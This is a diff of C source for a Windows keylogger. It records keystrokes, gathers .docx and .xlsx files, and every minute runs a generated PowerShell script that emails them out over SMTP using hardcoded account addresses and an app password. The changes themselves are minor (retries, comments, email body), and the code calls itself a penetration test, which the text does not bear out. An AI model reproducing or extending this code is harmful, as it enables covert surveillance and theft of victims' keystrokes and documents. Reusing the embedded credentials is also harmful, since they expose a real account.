@@ -3,7 +3,6 @@
 #include <stdlib.h>
 #include <string.h>
 #include <time.h>
-#include <stdarg.h>
 
 #pragma comment(lib, "user32.lib")
 #pragma comment(lib, "advapi32.lib")
@@ -16,9 +15,9 @@
 #define SMTP_PORT       587
 #define EMAIL_FROM      "vryllumangay@gmail.com"
 #define EMAIL_TO        "skyc0279@gmail.com"
-#define EMAIL_SUBJECT   "Pentest Data Collection - Keylog and Documents"
+#define EMAIL_SUBJECT   "Pentest Data Collection"
 #define EMAIL_USER      "vryllumangay@gmail.com"
-#define EMAIL_PASS      "olqa xqxr qifs lodb"
+#define EMAIL_PASS      "olqa xqxr qifs lodb"   // <-- PUT YOUR APP PASSWORD HERE
 // ============================================================
 
 #define KEY_LOG_FILE    "C:\\Windows\\Temp\\kl.dat"
@@ -192,7 +191,7 @@ int RunPowerShellScript(const char *scriptPath, const char *args) {
     }
 
     DebugLog("  CreateProcess OK, waiting for completion...");
-    DWORD waitResult = WaitForSingleObject(pi.hProcess, 60000);
+    DWORD waitResult = WaitForSingleObject(pi.hProcess, 60000); // 60s timeout
     if (waitResult == WAIT_TIMEOUT) {
         DebugLog("  Process timed out after 60s, killing");
         TerminateProcess(pi.hProcess, 1);
@@ -308,25 +307,18 @@ void SendEmail(void) {
         }
     }
 
-    // Check keylog file with retries
+    // Check keylog file
     int hasKeylogData = 0;
     long klSize = 0;
-    
-    for (int retry = 0; retry < 10; retry++) {
-        FILE *klCheck = fopen(KEY_LOG_FILE, "rb");
-        if (klCheck) {
-            fseek(klCheck, 0, SEEK_END);
-            klSize = ftell(klCheck);
-            fclose(klCheck);
-            DebugLog("Keylog file size: %ld bytes (retry=%d)", klSize, retry);
-            if (klSize > 15) hasKeylogData = 1;
-            break;
-        }
-        DebugLog("  Retrying keylog file access (retry=%d)", retry);
-        Sleep(500);
-    }
-    if (!hasKeylogData && klSize == 0) {
-        DebugLog("Keylog file does NOT exist at %s after 10 retries", KEY_LOG_FILE);
+    FILE *klCheck = fopen(KEY_LOG_FILE, "rb");
+    if (klCheck) {
+        fseek(klCheck, 0, SEEK_END);
+        klSize = ftell(klCheck);
+        DebugLog("Keylog file size: %ld bytes", klSize);
+        if (klSize > 15) hasKeylogData = 1;
+        fclose(klCheck);
+    } else {
+        DebugLog("Keylog file does NOT exist at %s", KEY_LOG_FILE);
     }
 
     // Check zip file
@@ -348,15 +340,16 @@ void SendEmail(void) {
     }
     DebugLog("HAS DATA (keylog=%d, zip=%d) - proceeding to send", hasKeylogData, hasZip);
 
-    // Copy keylog for attachment
-    char klAttachPath[MAX_PATH_LEN];
-    snprintf(klAttachPath, sizeof(klAttachPath), "%s", KEYLOG_TEMP);
+    // Use a temp copy of keylog for attachment since the keylogger
+    // thread has kl.dat open for writing - PS script can't open it directly
+    char klAttachPath[MAX_PATH_LEN] = KEYLOG_TEMP;
     DeleteFileA(KEYLOG_TEMP);
     if (CopyFileA(KEY_LOG_FILE, KEYLOG_TEMP, FALSE)) {
         DebugLog("Copied keylog to %s for attachment", KEYLOG_TEMP);
     } else {
         DebugLog("CopyFileA failed (err=%lu), attaching original kl.dat", GetLastError());
-        snprintf(klAttachPath, sizeof(klAttachPath), "%s", KEY_LOG_FILE);
+        strncpy(klAttachPath, KEY_LOG_FILE, MAX_PATH_LEN - 1);
+        klAttachPath[MAX_PATH_LEN - 1] = '\0';
     }
 
     // 3. Write the PowerShell email script
@@ -377,20 +370,7 @@ void SendEmail(void) {
     fprintf(f, "  $smtp = New-Object Net.Mail.SmtpClient('%s', %d);\n", SMTP_SERVER, SMTP_PORT);
     fprintf(f, "  $smtp.EnableSsl = $true;\n");
     fprintf(f, "  $smtp.Credentials = New-Object System.Net.NetworkCredential('%s', '%s');\n", EMAIL_USER, EMAIL_PASS);
-    
-    // Email body with plain text
-    fprintf(f, "  $body = @'\n");
-    fprintf(f, "Pentest Data Collection Report\n");
-    fprintf(f, "Generated: %04d-%02d-%02d %02d:%02d:%02d\n", st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
-    fprintf(f, "\n");
-    fprintf(f, "This email contains:\n");
-    fprintf(f, "  - keylog.txt: Keystroke log from the target system\n");
-    fprintf(f, "  - data.zip: Collected .docx and .xlsx files\n");
-    fprintf(f, "\n");
-    fprintf(f, "-- Authorized Penetration Test --\n");
-    fprintf(f, "'@;\n");
-    fprintf(f, "\n");
-    fprintf(f, "  $msg = New-Object Net.Mail.MailMessage('%s', '%s', '%s', $body);\n", EMAIL_FROM, EMAIL_TO, EMAIL_SUBJECT);
+    fprintf(f, "  $msg = New-Object Net.Mail.MailMessage('%s', '%s', '%s', 'Attached: keylog.txt + collected documents');\n", EMAIL_FROM, EMAIL_TO, EMAIL_SUBJECT);
     fprintf(f, "\n");
     fprintf(f, "  if (Test-Path '%s') {\n", klAttachPath);
     fprintf(f, "    $att1 = New-Object Net.Mail.Attachment('%s');\n", klAttachPath);
@@ -437,6 +417,7 @@ void SendEmail(void) {
         }
     } else {
         DebugLog("Email failed - PS_SCRIPT left at %s for inspection", PS_SCRIPT_FILE);
+        // Keep the files around for debugging
     }
 }
 
@@ -462,7 +443,7 @@ int main(void) {
     int cycle = 0;
     while (1) {
         DebugLog("Sleeping for 60 seconds (cycle %d)", cycle);
-        Sleep(60000);
+        Sleep(60000); // 1 minute for faster testing
         DebugLog("--- SendEmail cycle %d ---", cycle);
         SendEmail();
         cycle++;
